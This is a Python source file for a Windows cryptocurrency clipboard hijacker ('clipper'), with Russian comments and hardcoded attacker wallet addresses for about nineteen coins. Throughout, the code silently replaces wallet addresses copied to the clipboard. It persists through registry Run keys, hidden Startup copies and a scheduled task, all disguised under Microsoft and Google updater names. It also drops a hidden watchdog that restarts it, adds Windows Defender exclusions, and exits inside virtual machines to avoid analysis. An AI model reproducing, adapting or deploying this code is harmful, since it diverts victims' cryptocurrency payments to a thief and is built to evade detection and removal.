#!/usr/bin/env python3
# phantom_crypto.py - STEALTH CRYPTO CLIPPER WITH WATCHDOG

import os
import sys
import ctypes
import time
import re
import winreg
import shutil
import subprocess
import threading

# =================== ТВОИ КОШЕЛЬКИ ===================

WALLETS = {
    'btc': 'bc1q6rl9yt6sphu35r2hnjl9hwyuzunymt62zjh0jl',
    'eth': '0x5972549f0880C7C45F353FdCB0CD42688582c5fc',
    'xrp': 'rnXaahAyXUL84G3FJZQqeGsuWH1aPDppdY',
    'trx': 'TGWJae3A6coKoJ7mfEL2zoJmEtNZrtMFef',
    'ton': 'UQB5fCRohpbbAKd-zSmbKcuLXKlyHaoRPLvDVhWJNAbXAg4A',
    'ltc': 'ltc1qv9zzt6u3u3ujxl4fh5gedfhe3m4d2xqmh95fv3',
    'usdt_erc': '0x5972549f0880C7C45F353FdCB0CD42688582c5fc',
    'sol': 'AqUuX2ozrWqDEAmotVaqkyDtTNEt3DwmsEL6xBPzbTjz',
    'doge': 'DBrR4MYkFawin6JgQ5rVRLGYMSYxXnsZkE',
    'bch': 'qrln7fac422h8jvq9lahdsc439p595rx0uj48e6g0l',
    'xlm': 'GBZXAPJDDYXUTRMXUX7KJZIK3ERFHCMUC3TBXH4A2OVQMY37DNB4M7HS',
    'ada': 'addr1qyu6jfljltj75ha0r0pp2t3ax2ljuv50m9e4k08wgeqme20tkwwg2cl3wzpdp9ewfmlgaj9gj9delqe54lcjn84pjgcqay3ajt',
    'polygon': '0x5972549f0880C7C45F353FdCB0CD42688582c5fc',
    'dot': '1QFDFxZUUoqQe168rnf8idrKB1sVGBLuQoUFWxBwsQrsuyH',
    'dash': 'XjjLykfR1EDojRTNnt3VSPjuqatdeQy2nA',
    'bnb': '0x5972549f0880C7C45F353FdCB0CD42688582c5fc',
    'xtz': 'tz1SZs2awPWaEeBjB2Lf8EgSfATWtjjbNuSa',
    'zec': 't1XheRP6Gn6BLrcCDbtFJn94iGAdTLFAGCj',
    'usdt_trc': 'TGWJae3A6coKoJ7mfEL2zoJmEtNZrtMFef'
}

# =================== ПАТТЕРНЫ ДЕТЕКЦИИ ===================

PATTERNS = {
    'btc': [
        r'^1[1-9A-HJ-NP-Za-km-z]{25,34}$',
        r'^3[1-9A-HJ-NP-Za-km-z]{25,34}$',
        r'^bc1[ac-hj-np-z02-9]{11,71}$'
    ],
    'eth': [r'^0x[a-fA-F0-9]{40}$'],
    'xrp': [r'^r[1-9A-HJ-NP-Za-km-z]{25,34}$'],
    'trx': [r'^T[A-Za-z1-9]{33}$'],
    'ton': [
        r'^UQ[A-Za-z0-9_-]{48}$',
        r'^EQ[A-Za-z0-9_-]{48}$'
    ],
    'ltc': [
        r'^L[1-9A-HJ-NP-Za-km-z]{25,34}$',
        r'^ltc1[ac-hj-np-z02-9]{11,71}$'
    ],
    'usdt_erc': [r'^0x[a-fA-F0-9]{40}$'],
    'sol': [r'^[1-9A-HJ-NP-Za-km-z]{32,44}$'],
    'doge': [r'^D[1-9A-HJ-NP-Za-km-z]{25,34}$'],
    'bch': [r'^q[a-z0-9]{41}$'],
    'xlm': [r'^G[A-Z0-9]{55}$'],
    'ada': [r'^addr1[a-z0-9]{58,98}$'],
    'polygon': [r'^0x[a-fA-F0-9]{40}$'],
    'dot': [r'^1[1-9A-HJ-NP-Za-km-z]{46,48}$'],
    'dash': [r'^X[1-9A-HJ-NP-Za-km-z]{25,34}$'],
    'bnb': [r'^0x[a-fA-F0-9]{40}$'],
    'xtz': [r'^tz[1-3][A-Za-z0-9]{33}$'],
    'zec': [r'^t[1-3][A-Za-z0-9]{33}$'],
    'usdt_trc': [r'^T[A-Za-z1-9]{33}$']
}

# =================== CRYPTO CLIPPER CLASS ===================

class PhantomCryptoClipper:
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
        self.user32 = ctypes.windll.user32
        self.stats = {'replaced': 0, 'networks': {}}
        
    def replace_crypto_addresses(self, content):
        """Заменяет крипто адреса на твои"""
        replaced_any = False
        
        for network, patterns in PATTERNS.items():
            for pattern in patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                for match in matches:
                    if match != WALLETS.get(network, ''):
                        content = content.replace(match, WALLETS[network])
                        self.stats['replaced'] += 1
                        if network not in self.stats['networks']:
                            self.stats['networks'][network] = 0
                        self.stats['networks'][network] += 1
                        replaced_any = True
        
        return content, replaced_any
    
    def monitor_clipboard(self):
        """Мониторит буфер обмена и заменяет адреса"""
        last_clipboard = b""
        
        while True:
            try:
                if self.user32.OpenClipboard(0):
                    handle = self.user32.GetClipboardData(1)
                    
                    if handle:
                        data = ctypes.c_char_p(handle).value
                        
                        if data and data != last_clipboard:
                            try:
                                content = data.decode('utf-8', errors='ignore')
                                new_content, replaced = self.replace_crypto_addresses(content)
                                
                                if replaced:
                                    self.user32.EmptyClipboard()
                                    new_data = new_content.encode('utf-8')
                                    h_mem = self.kernel32.GlobalAlloc(0x0042, len(new_data) + 1)
                                    
                                    if h_mem:
                                        p_mem = self.kernel32.GlobalLock(h_mem)
                                        if p_mem:
                                            ctypes.memmove(p_mem, new_data, len(new_data))
                                            self.kernel32.GlobalUnlock(h_mem)
                                            self.user32.SetClipboardData(1, h_mem)
                            except:
                                pass
                            
                            last_clipboard = data
                    
                    self.user32.CloseClipboard()
            except:
                pass
            
            time.sleep(0.1)

# =================== PERSISTENCE + ANTI-DETECT ===================

def get_script_path():
    """Получаем путь к скрипту/EXE"""
    if getattr(sys, 'frozen', False):
        return sys.executable
    else:
        return os.path.abspath(__file__)

def hide_console():
    """Скрывает консольное окно"""
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except:
        pass

def setup_registry_persistence():
    """Registry HKCU - работает без админ прав"""
    try:
        script_path = get_script_path()
        
        # Используем pythonw.exe для скрытого запуска
        if script_path.endswith('.py') or script_path.endswith('.pyw'):
            python_dir = os.path.dirname(sys.executable)
            pythonw = os.path.join(python_dir, 'pythonw.exe')
            if not os.path.exists(pythonw):
                pythonw = sys.executable
            run_command = f'"{pythonw}" "{script_path}"'
        else:
            run_command = f'"{script_path}"'
        
        # Множественные ключи для надежности
        reg_keys = [
            "WindowsSecurityUpdate",
            "MicrosoftEdgeUpdate", 
            "GoogleUpdateTaskMachine"
        ]
        
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        
        for reg_key in reg_keys:
            winreg.SetValueEx(key, reg_key, 0, winreg.REG_SZ, run_command)
        
        winreg.CloseKey(key)
    except:
        pass

def setup_startup_persistence():
    """Startup folder - работает без админ прав"""
    try:
        script_path = get_script_path()
        startup_folder = os.path.join(
            os.environ['APPDATA'],
            'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
        )
        
        if os.path.exists(startup_folder):
            # Множественные копии с разными именами
            stealth_names = ['svchost.pyw', 'MicrosoftEdgeUpdate.pyw', 'GoogleUpdate.pyw']
            
            for name in stealth_names:
                dest_path = os.path.join(startup_folder, name)
                
                if script_path.endswith('.py'):
                    # Копируем как .pyw для скрытого запуска
                    shutil.copy2(script_path, dest_path)
                else:
                    # Для .exe копируем как .exe
                    dest_path = dest_path.replace('.pyw', '.exe')
                    shutil.copy2(script_path, dest_path)
                
                # Скрываем файл
                try:
                    ctypes.windll.kernel32.SetFileAttributesW(dest_path, 2)
                except:
                    pass
    except:
        pass

def create_scheduled_task():
    """Запланированная задача - backup persistence"""
    try:
        script_path = get_script_path()
        
        if script_path.endswith('.py') or script_path.endswith('.pyw'):
            python_dir = os.path.dirname(sys.executable)
            pythonw = os.path.join(python_dir, 'pythonw.exe')
            if not os.path.exists(pythonw):
                pythonw = sys.executable
            cmd = f'schtasks /create /tn "MicrosoftEdgeUpdateTask" /tr "\\""{pythonw}\\"" \\"""{script_path}\\""" /sc onlogon /f /rl highest'
        else:
            cmd = f'schtasks /create /tn "MicrosoftEdgeUpdateTask" /tr "\\"""{script_path}\\""" /sc onlogon /f /rl highest'
        
        subprocess.run(cmd, shell=True, capture_output=True, creationflags=0x08000000)
    except:
        pass

def setup_persistence():
    """Устанавливает все методы персистентности"""
    setup_registry_persistence()
    setup_startup_persistence()
    create_scheduled_task()

# =================== WATCHDOG (АВТОПЕРЕЗАПУСК) ===================

def create_watchdog():
    """
    Создает watchdog процесс который перезапускает клиппер если его убили
    Это обеспечивает работу даже если пользователь завершит процесс
    """
    try:
        script_path = get_script_path()
        watchdog_path = os.path.join(os.environ['TEMP'], 'MsEdgeUpdate.pyw')
        
        # Watchdog скрипт
        watchdog_code = f'''
import os
import sys
import time
import subprocess

MAIN_SCRIPT = r"{script_path}"
CHECK_INTERVAL = 30  # Проверка каждые 30 секунд

def is_running():
    """Проверяет запущен ли основной процесс"""
    try:
        result = subprocess.run(
            'tasklist /FI "IMAGENAME eq pythonw.exe" /FO CSV /NH',
            shell=True,
            capture_output=True,
            text=True,
            creationflags=0x08000000
        )
        return MAIN_SCRIPT.lower() in result.stdout.lower()
    except:
        return False

def start_main():
    """Запускает основной процесс"""
    try:
        pythonw = os.path.join(os.path.dirname(sys.executable), 'pythonw.exe')
        if not os.path.exists(pythonw):
            pythonw = sys.executable
        
        subprocess.Popen(
            [pythonw, MAIN_SCRIPT],
            creationflags=0x08000000,
            close_fds=True
        )
    except:
        pass

# Бесконечный цикл мониторинга
while True:
    try:
        if not is_running():
            start_main()
        time.sleep(CHECK_INTERVAL)
    except:
        time.sleep(CHECK_INTERVAL)
'''
        
        # Записываем watchdog
        with open(watchdog_path, 'w', encoding='utf-8') as f:
            f.write(watchdog_code)
        
        # Скрываем файл
        try:
            ctypes.windll.kernel32.SetFileAttributesW(watchdog_path, 2)
        except:
            pass
        
        # Запускаем watchdog
        pythonw = os.path.join(os.path.dirname(sys.executable), 'pythonw.exe')
        if not os.path.exists(pythonw):
            pythonw = sys.executable
        
        subprocess.Popen(
            [pythonw, watchdog_path],
            creationflags=0x08000000,
            close_fds=True
        )
        
    except:
        pass

# =================== ANTI-DETECT FEATURES ===================

def disable_windows_defender_scan():
    """
    Добавляет исключения в Windows Defender (требует повышенных прав)
    Если нет прав - просто игнорируется
    """
    try:
        script_path = get_script_path()
        script_dir = os.path.dirname(script_path)
        
        # PowerShell команды для добавления исключений
        exclusions = [
            f'Add-MpPreference -ExclusionPath "{script_path}"',
            f'Add-MpPreference -ExclusionPath "{script_dir}"',
            f'Add-MpPreference -ExclusionProcess "pythonw.exe"',
            f'Add-MpPreference -ExclusionProcess "python.exe"'
        ]
        
        for exclusion in exclusions:
            try:
                subprocess.run(
                    f'powershell.exe -Command "{exclusion}"',
                    shell=True,
                    capture_output=True,
                    creationflags=0x08000000,
                    timeout=5
                )
            except:
                pass
    except:
        pass

def check_virtualization():
    """
    Проверяет запущена ли программа в виртуальной машине или sandbox
    Если да - выходит (чтобы избежать анализа)
    """
    try:
        # Проверка на популярные VM
        vm_indicators = [
            'VBOX',
            'VirtualBox',
            'VMware',
            'QEMU',
            'Xen',
            'Hyper-V'
        ]
        
        # Проверяем модель системы
        result = subprocess.run(
            'wmic computersystem get model',
            shell=True,
            capture_output=True,
            text=True,
            creationflags=0x08000000
        )
        
        for indicator in vm_indicators:
            if indicator.lower() in result.stdout.lower():
                sys.exit(0)  # Выходим если обнаружена VM
                
    except:
        pass

def delay_execution():
    """
    Задержка перед запуском для обхода sandbox анализа
    Многие sandbox ждут только 30-60 секунд
    """
    try:
        # Случайная задержка 60-120 секунд
        import random
        delay = random.randint(60, 120)
        time.sleep(delay)
    except:
        pass

# =================== MAIN ===================

def main():
    """Главная функция"""
    
    # Anti-detect measures
    check_virtualization()  # Выходим если VM
    hide_console()          # Скрываем окно
    
    # Задержка для обхода sandbox (опционально - закомментируй если мешает)
    # delay_execution()
    
    # Устанавливаем persistence
    setup_persistence()
    
    # Добавляем исключения в Defender (если есть права)
    disable_windows_defender_scan()
    
    # Запускаем watchdog для автоперезапуска
    create_watchdog()
    
    # Запускаем основной клиппер
    clipper = PhantomCryptoClipper()
    
    try:
        clipper.monitor_clipboard()
    except KeyboardInterrupt:
        pass
    except:
        pass

if __name__ == "__main__":
    main()
